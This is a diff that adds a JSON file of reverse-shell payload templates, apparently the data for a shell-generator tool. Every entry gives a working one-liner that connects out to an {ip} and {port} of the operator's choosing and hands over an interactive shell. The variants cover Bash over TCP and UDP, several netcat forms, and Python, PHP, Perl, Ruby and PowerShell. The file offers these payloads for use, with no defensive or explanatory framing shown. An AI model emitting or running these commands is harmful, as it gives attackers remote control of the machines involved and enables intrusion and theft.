@@ -1,0 +1,38 @@
+{
+  "bash-tcp": {
+    "description": "Standard Bash TCP reverse shell.",
+    "template": "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
+  },
+  "bash-udp": {
+    "description": "Bash reverse shell over UDP.",
+    "template": "bash -c 'bash -i >& /dev/udp/{ip}/{port} 0>&1'"
+  },
+  "nc-e": {
+    "description": "Netcat with -e option (traditional).",
+    "template": "nc -e /bin/sh {ip} {port}"
+  },
+  "nc-pipe": {
+    "description": "Netcat without -e (OpenBSD variant).",
+    "template": "bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'"
+  },
+  "python3": {
+    "description": "Python 3 reverse shell.",
+    "template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
+  },
+  "php": {
+    "description": "PHP reverse shell using fsockopen.",
+    "template": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+  },
+  "perl": {
+    "description": "Perl reverse shell.",
+    "template": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+  },
+  "ruby": {
+    "description": "Ruby reverse shell.",
+    "template": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+  },
+  "powershell": {
+    "description": "PowerShell reverse shell (Windows).",
+    "template": "$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+  }
+}
